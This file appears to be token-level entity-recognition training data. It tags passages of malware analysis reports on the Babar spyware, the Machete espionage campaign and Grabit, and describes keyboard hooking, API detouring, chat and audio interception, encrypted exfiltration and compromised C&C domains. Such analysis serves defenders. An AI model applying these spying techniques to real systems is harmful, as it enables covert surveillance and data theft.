example	O
posted	O
at	O
[	O
4	O
]	O
.	O
The	O
Babar	B-Entity
implant	I-Entity
applies	B-Action
global	I-Action
Windows	B-Entity
hooks	B-Action
to	O
load	O
its	O
DLL	O
into	O
the	O
process	B-Entity
space	I-Entity
of	I-Entity
other	I-Entity
processes	I-Entity
.	O
A	O
global	O
hook	O
is	O
installed	O
by	O
calling	O
SetWindowsHookEx	O
by	O
passing	O
the	O
thread	O
ID	O
zero	O
.	O
It	O
applies	O
to	O
all	O
processes	O
running	O
in	O
the	O
same	O
desktop	O
,	O
having	O
the	O
same	O
'	O
bitness	O
'	O
as	O
the	O
DLL	O
to	O
be	O
injected	O
.	O
In	O
the	O
given	O
case	O
this	O
applies	O
to	O
all	O
32-bit	O
processes	O
.	O
A	O
global	B-Entity
Windows	I-Entity
hook	I-Entity
is	O
installed	B-Action
into	O
the	O
Windows	B-Entity
event	I-Entity
chain	I-Entity
.	O
This	O
effectively	O
means	O
code	O
provided	O
by	O
the	O
hooking	O
DLL	O
gets	O
executed	O
whenever	O
an	O
arbitrary	O
desktop	O
process	O
receives	O
an	O
event	O
of	O
a	O
type	O
specified	O
by	O
the	O
hook	O
.	O
Babar	O
installs	O
hooks	O
for	O
type	O
2	O
and	O
3	O
,	O
which	O
are	O
WH_KEYBOARD	O
and	O
WH_GETMESSAGE	O
.	O
This	O
way	O
Babar	O
has	O
control	O
over	O
all	O
keyboard	O
and	O
message	O
events	O
received	O
by	O
any	O
application	O
on	O
the	O
same	O
Windows	O
desktop	O
.	O
Through	O
the	O
hook	O
mechanism	O
Babar	O
can	O
be	O
maximum	O
invasive	O
in	O
the	O
Windows	O
userland	O
.	O
Once	O
in	O
the	O
context	O
of	O
a	O
desired	O
target	O
process	O
,	O
the	B-Entity
malware	I-Entity
goes	O
on	O
to	O
hook	O
specific	O
APIs	B-Entity
of	I-Entity
interest	I-Entity
.	O
This	O
is	O
achieved	O
by	O
applying	O
the	O
detours	O
technique	O
,	O
which	O
implements	O
trampoline	O
functions	O
to	O
be	O
invoked	O
every	O
time	O
a	O
hooked	O
API	O
is	O
called	O
[	O
6	O
]	O
.	O
To	O
achieve	O
this	O
,	O
Babar	O
rewrites	O
the	O
in	O
-	O
memory	O
code	O
for	O
target	O
APIs	O
.	O
A	O
call	O
to	O
a	O
hooked	O
API	O
then	O
results	O
in	O
the	O
calling	O
application	O
invoking	O
a	O
trampoline	O
function	O
,	O
which	O
performs	O
malicious	O
activity	O
and	O
then	O
passes	O
control	O
on	O
to	O
the	O
legitimate	O
API	O
.	O
Babar	O
supports	O
trampoline	O
functions	O
for	O
a	O
limited	O
list	O
of	O
APIs	O
and	O
limited	O
to	O
a	O
set	O
of	O
processes	O
of	O
interest	O
,	O
defined	O
by	O
its	O
configuration	O
.	O
The	O
list	O
of	O
APIs	O
to	O
hook	O
is	O
parted	O
in	O
three	O
groups	O
.	O
Any	O
set	O
of	O
hooks	O
will	O
only	O
be	O
applied	O
to	O
a	O
defined	O
set	O
of	O
processes	O
.	O
The	O
predefined	O
groups	O
of	O
application	O
names	O
retrieved	O
from	O
the	O
hardcoded	O
configuration	O
data	O
set	O
the	O
scope	O
of	O
Babar	O
's	O
hooking	O
advances	O
.	O
The	O
respective	B-Entity
trampolines	I-Entity
steal	B-Action
data	B-Modifier
going	B-Entity
in	I-Entity
or	I-Entity
out	I-Entity
of	I-Entity
the	I-Entity
hooked	I-Entity
APIs	I-Entity
on	O
the	O
fly	O
.	O
The	O
parsing	O
function	O
for	O
intercepted	O
internet	O
communication	O
searches	O
for	O
chat	O
traffic	O
,	O
more	O
specifically	O
for	O
messages	O
conforming	O
with	O
the	O
MSNP21	O
standard	O
.	O
Babar	O
is	O
searching	O
for	O
tags	O
such	O
as	O
'	O
Message-	O
Type	O
'	O
,	O
'	O
Reliability	O
'	O
,	O
'	O
To	O
'	O
,	O
'	O
From	O
'	O
or	O
'	O
Text	O
'	O
to	O
pick	O
out	O
of	O
the	O
stream	O
.	O
A	O
more	O
detailed	O
explanation	O
concerning	O
the	O
MSNP21	O
can	O
be	O
found	O
at	O
[	O
7	O
]	O
.	O
MSNP21	O
is	O
the	O
MSN	O
messenger	O
chat	O
protocol	O
that	O
was	O
introduced	O
with	O
Windows	O
Live	O
2010	O
beta	O
.	O
It	O
is	O
unclear	O
though	O
as	O
of	O
why	O
only	O
parsing	O
for	O
the	O
MSN	O
messenger	O
is	O
supported	O
.	O
The	O
data	O
,	O
like	O
all	O
stolen	O
information	O
,	O
is	O
handled	O
by	O
a	B-Entity
separate	I-Entity
thread	I-Entity
which	O
compresses	O
and	O
encrypts	B-Action
it	B-Entity
before	O
dumping	O
it	O
to	O
a	O
file	O
on	O
disk	O
.	O
For	O
grabbing	B-Action
audio	B-Entity
streams	O
Babar	O
includes	O
code	B-Action
from	B-Entity
the	I-Entity
OpenCORE	I-Entity
AMR	I-Entity
library	I-Entity
[	O
8	O
]	O
.	O
AMR	O
enables	O
the	O
malware	O
to	O
encode	O
and	O
decode	O
raw	O
audio	O
frames	O
as	O
they	O
are	O
passed	O
to	O
or	O
grabbed	O
from	O
the	O
audio	O
devices	O
.	O
The	O
very	O
same	O
malware	O
module	O
performs	O
screen	O
captures	O
while	O
dumping	O
the	O
snooped	O
data	O
.	O
This	O
is	O
assumed	O
to	O
happen	O
to	O
recognize	O
the	O
parties	O
involved	O
in	O
the	O
conversation	O
by	O
capturing	O
the	O
GUI	O
of	O
the	O
softphone	O
application	O
.	O
Babar	O
comes	O
with	O
the	O
Deflate	O
algorithm	O
,	O
as	O
used	O
by	O
Zlib	O
,	O
to	O
be	O
able	O
to	O
compress	O
data	O
before	O
encrypting	O
it	O
and	O
dumping	O
it	O
to	O
disk	O
.	O
The	O
data	O
is	O
encrypted	O
with	O
128-bit	O
AES	O
using	O
the	O
key	O
24	O
FE	O
C5	O
AD	O
34	O
56	O
F7	O
F8	O
12	O
01	O
00	O
AE	O
B6	O
7C	O
DE	O
AB	O
for	O
reading	O
and	O
writing	O
files	O
.	O
The	O
following	O
files	O
have	O
been	O
seen	O
to	O
be	O
dumped	O
to	O
Babar	O
's	O
working	O
directory	O
under	O
%	O
APPDATA%\MSI	O
.	O
Stolen	O
information	O
will	O
be	O
handled	O
by	O
the	O
Babar	O
main	O
instance	O
,	O
which	O
receives	O
data	O
through	O
six	O
named	O
pipes	O
from	O
other	O
instances	O
or	O
hooked	O
processes	O
.	O
The	O
update.msi-file	O
stores	O
data	O
collected	O
by	O
the	O
keylogging	O
module	O
.	O
It	O
posesses	O
a	O
file	O
header	O
which	O
among	O
other	O
attributes	O
keeps	O
system	O
specific	O
data	O
.	O
This	O
is	O
assumed	O
to	O
serve	O
for	O
mapping	O
of	O
logfiles	O
to	O
infected	O
hosts	O
.	O
Log	O
lines	O
written	O
for	O
stolen	O
data	O
from	O
browsers	O
and	O
the	O
MSN	O
messenger	O
are	O
built	O
by	O
the	O
format	O
string	O
"	O
%	O
s%c%s|%s\n	O
"	O
,	O
where	O
the	O
first	O
string	O
is	O
likely	O
participant1	O
of	O
a	O
conversation	O
,	O
the	O
second	O
string	O
participant2	O
.	O
Both	O
are	O
parted	O
by	O
the	O
characters	O
'	O
<	O
'	O
or	O
'	O
>	O
'	O
depending	O
on	O
the	O
direction	O
of	O
the	O
conversation	O
.	O
Similar	O
log	O
lines	O
accompany	O
dumped	O
sound	O
data	O
and	O
saved	O
documents	O
.	O
Sound	O
data	O
logs	O
follow	O
the	O
format	O
"	O
A|%u|%S	O
"	O
,	O
document	O
logs	O
the	O
format	O
"	O
%	O
I64i|%I64i|%I64i|%s%s|%s\n	O
"	O
.	O
For	O
documents	O
three	O
timestamps	O
are	O
included	O
as	O
well	O
as	O
whether	O
read	O
or	O
write	O
access	O
was	O
requested	O
,	O
indicated	O
by	O
'	O
R	O
'	O
or	O
'	O
W	O
'	O
or	O
'	O
-	O
'	O
.	O
The	O
last	O
placeholder	O
is	O
reserved	O
for	O
the	O
filename	O
.	O
At	O
the	O
time	O
of	O
writing	O
the	O
content	O
of	O
the	O
sound	O
data	O
log	O
line	O
remains	O
unclear	O
.	O
The	O
internet	O
communication	O
module	O
of	O
Babar	O
is	O
located	O
in	O
a	O
sparate	O
export	O
called	O
'	O
FindCtxSectionStringW	O
'	O
,	O
which	O
will	O
be	O
invoked	O
through	O
remote	O
thread	O
injection	O
at	O
runtime	O
.	O
Injection	O
is	O
achieved	O
the	O
same	O
way	O
as	O
the	O
infection	O
of	O
child	O
instances	O
described	O
in	O
section	O
3.4	O
.	O
The	O
analyzed	O
sample	O
of	O
Babar	O
has	O
two	B-Action
hard	B-Entity
coded	I-Entity
C&C	I-Entity
server	I-Entity
addresses	I-Entity
which	O
are	O
included	O
in	O
its	O
configuration	O
data	O
.	O
Both	O
servers	O
were	O
used	O
to	O
push	O
spied	O
information	O
onto	O
the	O
remote	B-Entity
site	I-Entity
.	O
It	O
remains	O
unclear	O
though	O
whether	O
the	O
C&Cs	O
also	O
served	O
to	O
instruct	O
the	O
infected	O
machines	O
per	O
commands	O
,	O
as	O
Babar	O
does	O
not	O
posess	O
obvious	O
command	O
parsing	O
functionality	O
.	O
Data	O
exfiltration	O
is	O
assumed	O
to	O
be	O
time	O
triggered	O
.	O
The	O
domain	O
horizons-tourisme.com	O
is	O
a	O
legitimate	O
website	O
,	O
operated	O
by	O
an	O
Algerian	O
travel	O
agency	O
,	O
located	O
in	O
Algiers	O
,	O
Algeria	O
.	O
The	O
website	O
is	O
in	O
French	O
and	O
still	O
online	O
today	O
.	O
Gezelimmi.com	O
is	O
a	O
Turkish	O
domain	O
,	O
currently	O
responding	O
with	O
an	O
HTTP	O
error	O
message	O
403	O
,	O
access	O
not	O
permitted	O
.	O
Both	O
domains	O
appear	O
to	O
be	O
of	O
legitimate	O
use	O
,	O
but	O
compromised	O
and	O
abused	O
to	O
host	O
Babar	O
's	O
server	O
side	O
infrastructure	O
.	O
At	O
the	O
time	O
of	O
writing	O
the	O
server	O
pointed	O
to	O
by	O
horizons-tourisme.com	O
is	O
still	O
hosting	O
left	O
overs	O
from	O
the	O
C&C	O
infrastructure	O
used	O
by	O
Babar	O
.	O
With	O
directory	O
traversal	O
activated	O
researchers	O
from	O
ESET	O
could	O
pull	O
a	O
minimalistic	O
directory	O
structure	O
,	O
showing	O
directories	O
named	O
as	O
follows	O
.	O
page	O
|	O
14	O
Obviously	O
,	O
the	O
directory	O
belonging	O
to	O
Babar	O
is	O
'	O
bb28	O
'	O
.	O
'	O
tfc422	O
'	O
matches	O
with	O
strings	O
found	O
in	O
the	O
TFC	O
bots	O
(	O
previously	O
named	O
NBOT	O
)	O
.	O
The	O
purpose	O
of	O
the	O
'	O
d13	O
'	O
directory	O
remains	O
unknown	O
,	O
although	O
it	O
is	O
assumed	O
to	O
serve	O
for	O
requests	O
of	O
a	O
third	O
currently	O
unknown	O
family	O
.	O
Most	O
of	O
the	O
directories	O
pulled	O
from	O
horizons-tourisme.com	O
are	O
empty	O
,	O
or	O
contain	O
empty	O
files	O
.	O
The	O
only	O
script	O
inside	O
the	O
bb28	O
directory	O
though	O
appears	O
to	O
be	O
interesting	O
.	O
Its	O
a	O
.php	O
-	O
script	O
named	O
config.inc	O
,	O
containing	O
variables	O
which	O
look	O
familiar	O
from	O
Babar	O
's	O
config	O
such	O
as	O
'	O
user	O
'	O
,	O
'	O
i	O
d	O
'	O
or	O
'	O
seq	O
'	O
,	O
but	O
also	O
a	O
handful	O
of	O
comments	O
from	O
the	O
authors	O
.	O
At	O
the	O
time	O
of	O
writing	O
two	O
Babar64	O
droppers	O
are	O
known	O
,	O
dropping	O
one	O
implant	O
each	O
.	O
They	O
both	O
show	O
traits	O
of	O
the	O
malware	O
described	O
by	O
CSEC	O
,	O
being	O
attributed	O
to	O
French	O
intelligence	O
with	O
„	O
moderate	O
certainty	O
"	O
[	O
2	O
]	O
.	O
The	O
CSEC	O
document	O
mentions	O
uncovering	O
the	O
attack	O
in	O
2009	O
.	O
The	O
compilation	O
timestamps	O
of	O
the	O
binaries	O
date	O
back	O
to	O
August	O
2011	O
.	O
While	O
these	O
can	O
be	O
faked	O
it	O
is	O
still	O
unlikely	O
that	O
the	O
authors	O
would	O
change	O
the	O
2009-timestamp	O
to	O
a	O
future	O
date	O
.	O
This	O
,	O
and	O
the	O
mentioning	O
of	O
'	O
Babar	O
'	O
instead	O
of	O
'	O
Babar64	O
'	O
by	O
CSEC	O
indicates	O
that	O
the	O
samples	O
at	O
hand	O
stem	O
from	O
a	O
more	O
recent	O
campaign	O
.	O
Besides	O
the	O
project	O
name	O
,	O
Babar64	O
also	O
shares	O
the	O
malformed	O
user	O
agent	O
string	O
described	O
in	O
the	O
document	O
,	O
where	O
a	O
letter	O
from	O
the	O
MSIE	O
6.0	O
name	O
is	O
missing	O
.	O
The	O
second	O
Babar64	O
binary	O
comes	O
with	O
its	O
own	O
set	O
of	O
C&C	O
servers	O
.	O
The	O
first	O
one	O
is	O
the	O
legitimate	O
website	O
of	O
AlexPetro	O
Technical	O
Services	O
,	O
a	O
company	O
operating	O
in	O
the	O
oil	O
and	O
gas	O
industry	O
in	O
Kairo	O
,	O
Egypt	O
.	O
The	O
second	O
domain	O
is	O
Iranian	O
,	O
allegedly	O
owned	O
by	O
a	O
web	O
design	O
company	O
named	O
Radcom	O
.	O
What	O
links	O
Babar64	O
to	O
other	O
families	O
analyzed	O
beforehand	O
,	O
such	O
as	O
Bunny	O
or	O
TFC	O
(	O
also	O
called	O
NBOT	O
)	O
are	O
shared	O
portions	O
of	O
source	O
code	O
and	O
re	O
-	O
used	O
coding	O
techniques	O
.	O
The	O
enumeration	O
of	O
anti	O
-	O
virus	O
software	O
and	O
the	O
code	O
to	O
query	O
the	O
system	O
's	O
proxy	O
settings	O
are	O
almost	O
identical	O
.	O
Furthermore	O
,	O
the	O
samples	O
at	O
hand	O
show	O
the	O
same	O
partial	O
API	O
name	O
obfuscation	O
as	O
Bunny	O
and	O
TFC	O
.	O
What	O
has	O
changed	O
is	O
the	O
hashing	O
algorithm	O
.	O
Also	O
common	O
among	O
all	O
of	O
the	O
families	O
seems	O
to	O
be	O
to	O
hold	O
system	O
specific	O
configuration	O
data	O
in	O
memory	O
at	O
runtime	O
,	O
although	O
this	O
holds	O
true	O
for	O
a	O
lot	O
of	O
malware	O
.	O
Putting	O
Babar	O
,	O
Bunny	O
and	O
TFC	O
in	O
context	O
a	O
number	O
of	O
conclusion	O
can	O
be	O
drawn	O
.	O
Looking	O
at	O
the	O
compilation	O
timestamps	O
and	O
assuming	O
they	O
are	O
not	O
faked	O
(	O
which	O
is	O
backed	O
by	O
VirusTotal	O
submission	O
dates	O
)	O
,	O
the	O
oldest	O
family	O
is	O
TFC	O
being	O
active	O
throughout	O
2010	O
.	O
These	O
are	O
DDoS	O
bots	O
,	O
used	O
to	O
build	O
a	O
botnet	O
which	O
can	O
be	O
utilized	O
to	O
attack	O
adversaries	O
on	O
the	O
internet	O
.	O
Next	O
on	O
the	O
timeline	O
is	O
Babar64	O
,	O
allegedly	O
compiled	O
middle	O
of	O
2011	O
and	O
first	O
seen	O
on	O
VirusTotal	O
middle	O
of	O
2012	O
.	O
It	O
is	O
believed	O
that	O
this	O
strain	O
has	O
been	O
active	O
from	O
2011	O
until	O
2013	O
,	O
spying	O
on	O
dedicated	O
targets	O
rather	O
than	O
being	O
spread	O
widely	O
.	O
Last	O
comes	O
Bunny	O
,	O
compiled	O
second	O
half	O
of	O
2011	O
and	O
making	O
its	O
first	O
public	O
appearance	O
during	O
the	O
analysis	O
of	O
the	O
Adobe	O
Reader	O
exploit	O
for	O
CVE-2011	O
-	O
4369	O
[	O
9	O
]	O
.	O
At	O
the	O
time	O
when	O
Bunny	O
was	O
spread	O
through	O
CVE-2011	O
-	O
4369	O
,	O
before	O
December	O
2011	O
,	O
the	O
vulnerability	O
was	O
unknown	O
to	O
the	O
public	O
.	O
Bunny	O
itself	O
is	O
a	O
Lua	O
script	O
execution	O
platform	O
,	O
not	O
including	O
any	O
spying	O
capabilities	O
.	O
All	O
three	O
families	O
leave	O
the	O
impression	O
of	O
being	O
developed	O
by	O
a	O
team	O
of	O
skilled	O
software	O
developers	O
,	O
rather	O
than	O
being	O
the	O
product	O
of	O
a	O
malware	O
author	O
operating	O
in	O
the	O
criminal	O
underground	O
.	O
Also	O
none	O
of	O
the	O
binaries	O
makes	O
attempts	O
of	O
hiding	O
its	O
intentions	O
,	O
which	O
is	O
a	O
common	O
trait	O
among	O
targeted	O
malware	O
.	O
Heavy	O
obfuscation	O
or	O
the	O
use	O
of	O
crypters	O
easily	O
raises	O
suspicion	O
of	O
heuristics	O
based	O
malware	O
scanners	O
.	O
However	O
,	O
besides	O
the	O
CSEC	O
document	O
there	O
was	O
no	O
obvious	O
pointer	O
found	O
leading	O
to	O
the	O
conclusion	O
that	O
Babar	O
and	O
its	O
companions	O
were	O
set	O
out	O
by	O
French	O
inteligence	O
services	O
.	O
As	O
it	O
is	O
with	O
digital	O
crime	O
,	O
chances	O
are	O
high	O
no	O
proof	O
will	O
ever	O
evolve	O
and	O
research	O
will	O
be	O
limited	O
to	O
educated	O
conclusions	O
.	O
The	O
drawing	O
of	O
personal	O
educated	O
conclusions	O
is	O
left	O
as	O
an	O
exercise	O
for	O
the	O
interested	O
reader	O
.	O
Lists	O
of	O
passive	O
DNS	O
entries	O
for	O
horizons-tourisme.com	O
and	O
gezelimmi.com	O
can	O
be	O
found	O
below	O
.	O
For	O
gezelimmi.com	O
.	O
For	O
horizons-tourisme.com	O
.	O
Some	O
time	O
ago	O
,	O
a	O
Kaspersky	O
Lab	O
customer	O
in	O
Latin	O
America	O
contacted	O
us	O
to	O
say	O
he	O
had	O
visited	O
China	O
and	O
suspected	O
his	O
machine	O
was	O
infected	O
with	O
an	O
unknown	O
,	O
undetected	O
malware	O
.	O
While	O
assisting	O
the	O
customer	O
,	O
we	O
found	O
a	O
very	O
interesting	O
file	O
in	O
the	O
system	O
that	O
is	O
completely	O
unrelated	O
to	O
China	O
and	O
contained	O
no	O
Chinese	O
coding	O
traces	O
.	O
At	O
first	O
look	O
,	O
it	O
pretends	O
to	O
be	O
a	O
Java	O
related	O
application	O
but	O
after	O
a	O
quick	O
analysis	O
,	O
it	O
was	O
obvious	O
this	O
was	O
something	O
more	O
than	O
just	O
a	O
simple	O
Java	O
file	O
.	O
It	O
was	O
a	O
targeted	O
attack	O
we	O
are	O
calling	O
"	O
Machete	O
"	O
.	O
"	O
Machete	O
"	O
is	O
a	O
targeted	O
attack	O
campaign	O
with	O
Spanish	O
speaking	O
roots	O
.	O
We	O
believe	O
this	O
campaign	O
started	O
in	O
2010	O
and	O
was	O
renewed	O
with	O
an	O
improved	O
infrastructure	O
in	O
2012	O
.	O
The	O
operation	O
may	O
be	O
still	O
"	O
active	O
"	O
.	O
The	O
malware	O
is	O
capable	B-Action
of	B-Entity
the	I-Entity
following	I-Entity
cyber	I-Entity
-	I-Entity
espionage	I-Entity
operations	I-Entity
.	O
Most	O
of	O
the	O
victims	O
are	O
located	O
in	O
,	O
Venezuela	O
,	O
Ecuador	O
,	O
Colombia	O
,	O
Peru	O
,	O
Russia	O
,	O
Cuba	O
,	O
and	O
Spain	O
,	O
among	O
others	O
.	O
In	O
some	O
cases	O
,	O
such	O
as	O
Russia	O
,	O
the	O
target	O
appears	O
to	O
be	O
an	O
embassy	O
from	O
one	O
of	O
the	O
countries	O
of	O
this	O
list	O
.	O
Targets	O
include	O
high	O
-	O
level	O
profiles	O
,	O
including	O
intelligence	O
services	O
,	O
military	O
,	O
embassies	O
and	O
government	O
institutions	O
.	O
The	O
malware	O
is	O
distributed	B-Action
via	B-Modifier
social	B-Entity
engineering	I-Entity
techniques	I-Entity
,	O
which	O
includes	O
spear	O
-	O
phishing	O
emails	O
and	O
infections	O
via	O
Web	O
by	O
a	O
fake	O
Blog	O
website	O
.	O
We	O
have	O
found	O
no	O
evidence	O
of	O
of	O
exploits	O
targeting	O
zero	O
-	O
day	O
vulnerabilities	O
.	O
Both	O
the	O
attackers	O
and	O
the	O
victims	O
appear	O
to	O
be	O
Spanish	O
-	O
speaking	O
.	O
During	O
this	O
investigation	O
,	O
we	O
also	O
discovered	B-Action
many	B-Entity
other	I-Entity
the	I-Entity
files	I-Entity
installing	O
this	O
cyber	B-Entity
-	I-Entity
espionage	I-Entity
tool	I-Entity
in	O
what	O
appears	B-Entity
to	I-Entity
be	I-Entity
a	I-Entity
dedicated	I-Entity
a	I-Entity
spear	I-Entity
phishing	I-Entity
campaign	I-Entity
.	O
These	O
files	O
display	O
a	O
PowerPoint	O
presentation	O
that	O
installs	O
the	O
malware	O
on	O
the	O
target	O
system	O
once	O
the	O
file	O
is	O
opened	O
.	O
These	O
are	O
the	O
names	O
of	O
the	O
PowerPoint	O
attachments	O
.	O
These	O
files	O
are	O
in	O
reality	O
Nullsoft	O
Installer	O
self	O
-	O
extracting	O
archives	O
and	O
have	O
compilation	O
dates	O
going	O
back	O
to	O
2008	O
.	O
A	O
consequence	O
of	O
the	O
embedded	O
Python	O
code	O
inside	O
the	O
executables	O
is	O
that	O
these	O
installers	O
include	O
all	O
the	O
necessary	O
Python	O
libraries	O
as	O
well	O
as	O
the	O
PowerPoint	O
file	O
shown	O
to	O
the	O
victim	O
during	O
the	O
installation	O
.	O
The	O
result	O
is	O
extremely	O
large	O
files	O
,	O
over	O
3	O
MB	O
.	O
Here	O
are	O
some	O
screnshots	O
of	O
the	O
mentioned	O
files	O
.	O
A	O
technical	O
relevant	O
fact	O
about	O
this	O
campaign	O
is	O
the	O
use	O
of	O
Python	O
embedded	O
into	O
Windows	O
executables	O
of	O
the	O
malware	O
.	O
This	O
is	O
very	O
unusual	O
and	O
does	O
not	O
have	O
any	O
advantage	O
for	O
the	O
attackers	O
except	O
ease	O
of	O
coding	O
.	O
There	O
is	O
no	O
multi	O
-	O
platform	O
support	O
as	O
the	O
code	O
is	O
heavily	O
Windows	O
-	O
oriented	O
(	O
use	O
of	O
libraries	O
)	O
.	O
However	O
,	O
we	O
discovered	O
several	O
clues	O
that	O
the	O
attackers	O
prepared	O
the	O
infrastructure	O
for	O
Mac	O
OS	O
X	O
and	O
Unix	O
victims	O
as	O
well	O
.	O
In	O
addition	O
to	O
Windows	O
components	O
,	O
we	O
also	O
found	O
a	O
mobile	O
(	O
Android	O
)	O
component	O
.	O
Both	O
attackers	O
and	O
victims	O
speak	O
Spanish	O
natively	O
,	O
as	O
we	O
see	O
it	O
consistently	O
in	O
the	O
source	O
code	O
of	O
the	O
client	O
side	O
and	O
in	O
the	O
Python	O
code	O
.	O
The	O
following	O
code	O
snippets	O
were	O
found	O
into	O
the	O
HTML	O
of	O
websites	O
used	O
to	O
infect	O
victims	O
.	O
Note	O
:	O
Thanks	O
to	O
Tyler	O
Hudak	O
from	O
Korelogic	O
who	O
noticed	O
that	O
the	O
above	O
HTML	O
is	O
copy	O
pasted	O
from	O
SET	O
,	O
The	O
Social	O
Engineering	O
Toolkit	O
.	O
Also	O
the	O
following	O
link	O
to	O
one	O
known	O
infection	O
artifact	O
.	O
hxxp://name.domain.org	O
/	O
nickname	O
/	O
set	O
/	O
Signed_Update.jar	O
The	O
following	O
are	O
domains	O
found	O
during	O
the	O
infection	O
campaign	O
.	O
Any	O
communication	O
with	O
them	O
must	O
be	O
considered	O
extremely	O
suspicious	O
Creates	O
the	O
file	O
Java	O
Update.lnk	O
pointing	O
to	O
appdata	O
/	O
Jre6/java.exe	O
Malware	O
is	O
installed	O
in	O
appdata/	O
MicroDes/	O
Running	O
processes	O
Creates	O
Task	O
Microsoft_up	O
The	O
first	O
evidence	O
is	O
the	O
language	O
used	O
,	O
both	O
for	O
the	O
victims	O
and	O
attackers	O
,	O
is	O
Spanish	O
.	O
The	O
victims	O
are	O
all	O
Spanish	O
speaking	O
according	O
to	O
the	O
filenames	O
of	O
the	O
stolen	O
documents	O
.	O
The	O
language	O
is	O
also	O
Spanish	O
for	O
the	O
operators	O
of	O
the	O
campaign	O
,	O
we	O
can	O
find	O
all	O
the	O
server	O
side	O
code	O
written	O
in	O
this	O
language	O
:	O
reportes	O
,	O
ingresar	O
,	O
peso	O
,	O
etc	O
.	O
The	O
"	O
Machete	O
"	O
discovery	O
shows	O
there	O
are	O
many	O
regional	O
players	O
in	O
the	O
world	O
of	O
targeted	O
attacks	O
.	O
Unfortunately	O
,	O
such	O
attacks	O
became	O
a	O
part	O
of	O
the	O
cyber	O
arsenal	O
of	O
many	O
nations	O
located	O
over	O
the	O
world	O
.	O
We	O
can	O
be	O
sure	O
there	O
are	O
other	O
parallel	O
targeted	O
attacks	O
running	O
now	O
in	O
Latin	O
America	O
and	O
other	O
regions	O
.	O
Kaspersky	O
Lab	O
products	O
detect	O
malicious	O
samples	O
related	O
to	O
this	O
targeted	O
attack	O
as	O
Trojan-	O
Spy	O
.	O
Python	O
.	O
Ragua	O
.	O
Note	O
:	O
A	O
full	O
analysis	O
of	O
the	O
Machete	O
attacks	O
is	O
available	O
to	O
the	O
Kaspersky	O
Intelligent	O
Services	O
customers	O
.	O
Not	O
so	O
long	O
ago	O
,	O
Kaspersky	O
clients	O
in	O
the	O
United	O
States	O
approached	O
Kaspersky	O
researchers	O
with	O
a	O
request	O
to	O
investigate	O
a	O
new	O
type	O
of	O
malicious	O
software	O
that	O
they	O
were	O
able	O
to	O
recover	O
from	O
their	O
organizations	O
'	O
servers	O
.	O
The	O
malware	O
calls	O
itself	O
Grabit	O
and	O
is	O
distinctive	O
because	O
of	O
its	O
versatile	O
behavior	O
.	O
Every	O
sample	O
we	O
found	O
was	O
different	O
in	O
size	O
and	O
activity	O
from	O
the	O
others	O
but	O
the	O
internal	O
name	O
and	O
other	O
identifiers	O
were	O
disturbingly	O
similar	O
.	O
The	O
timestamp	O
seems	O
valid	O
and	O
close	O
to	O
the	O
documented	O
infection	O
timeline	O
.	O
Our	O
documentation	O
points	O
to	O
a	O
campaign	O
that	O
started	O
somewhere	O
in	O
late	O
February	O
2015	O
and	O
ended	O
in	O
mid-	O
March	O
.	O
As	O
the	O
development	O
phase	O
supposedly	O
ended	O
,	O
malware	O
started	O
spreading	O
from	O
India	O
,	O
the	O
United	O
States	O
and	O
Israel	O
to	O
other	O
countries	O
around	O
the	O
globe	O
.	O
All	O
of	O
the	O
dozens	O
of	O
samples	O
we	O
managed	O
to	O
collect	O
were	O
programmed	O
in	O
Windows	O
machine	O
32bit	O
processor	O
,	O
over	O
the	O
Microsoft	O
.NET	O
Framework	O
(	O
Visual	O
Basic	O
/	O
C	O
#	O
)	O
.	O
Files	O
were	O
compiled	O
over	O
the	O
course	O
of	O
three	O
days	O
,	O
between	O
March	O
7th	O
and	O
9th	O
of	O
2015	O
.	O
The	O
following	O
chart	O
illustrates	O
how	O
the	O
group	O
or	O
individual	O
created	O
the	O
samples	O
,	O
the	O
size	O
of	O
each	O
sample	O
,	O
the	O
time	O
of	O
the	O
day	O
when	O
each	O
was	O
compiled	O
and	O
the	O
time	O
lapses	O
between	O
each	O
compilation	O
.	O
The	O
smallest	O
sample	O
(	O
0.52Mb	O
)	O
and	O
the	O
largest	O
(	O
1.57Mb	O
)	O
were	O
both	O
created	O
on	O
the	O
same	O
day	O
,	O
which	O
could	O
indicate	O
experiments	O
made	O
by	O
the	O
group	O
to	O
test	O
features	O
,	O
packers	O
and	O
"	O
dead	O
code	O
"	O
implementations	O
.	O
Looking	O
at	O
the	O
chart	O
,	O
it	O
is	O
interesting	O
to	O
see	O
the	O
modus	O
operandi	O
as	O
the	O
threat	O
actor	O
consistently	O
strives	O
to	O
achieve	O
a	O
variety	O
of	O
samples	O
,	O
different	O
code	O
sizes	O
and	O
supposedly	O
more	O
complicated	O
obfuscation	O
.	O
Along	O
with	O
these	O
different	O
sizes	O
,	O
activities	O
and	O
obfuscation	O
,	O
a	O
serious	O
encryption	O
algorithm	O
was	O
also	O
implemented	O
in	O
each	O
one	O
of	O
them	O
.	O
The	O
proprietary	O
obfuscated	O
string	O
,	O
methods	O
and	O
classes	O
made	O
it	O
rather	O
challenging	O
to	O
analyze	O
.	O
ASLR	O
is	O
also	O
enabled	O
,	O
which	O
might	O
point	O
to	O
an	O
open	O
source	O
RAT	O
or	O
even	O
a	O
commercial	O
framework	O
that	O
packed	O
the	O
malicious	O
software	O
in	O
a	O
well	O
written	O
structure	O
.	O
This	O
type	O
of	O
work	O
is	O
known	O
as	O
a	O
mitigation	O
factor	O
for	O
threat	O
actors	O
to	O
keep	O
their	O
code	O
hidden	O
from	O
analysts	O
'	O
eyes	O
.	O
During	O
our	O
research	O
,	O
dynamic	O
analysis	O
showed	O
that	O
the	O
malicious	O
software	O
's	O
"	O
call	O
home	O
"	O
functionality	O
communicates	O
over	O
obvious	O
channels	O
and	O
does	O
not	O
go	O
the	O
extra	O
mile	O
to	O
hide	O
its	O
activity	O
.	O
In	O
addition	O
,	O
the	O
files	O
themselves	O
were	O
not	O
programmed	O
to	O
make	O
any	O
kind	O
of	O
registry	O
maneuvers	O
that	O
would	O
hide	O
them	O
from	O
Windows	O
Explorer	O
.	O
Taking	O
that	O
into	O
an	O
equation	O
,	O
it	O
seems	O
that	O
the	O
threat	O
actors	O
are	O
sending	O
a	O
"	O
weak	O
knight	O
in	O
a	O
heavy	O
armor	O
"	O
to	O
war	O
.	O
It	O
means	O
that	O
whoever	O
programmed	O
the	O
malware	O
did	O
not	O
write	O
all	O
the	O
code	O
from	O
scratch	O
.	O
A	O
well	O
trained	O
knight	O
would	O
never	O
go	O
to	O
war	O
with	O
a	O
blazing	O
shield	O
and	O
yet	O
a	O
stick	O
for	O
a	O
sword	O
.	O
Looking	O
into	O
the	O
"	O
call	O
home	O
"	O
traffic	O
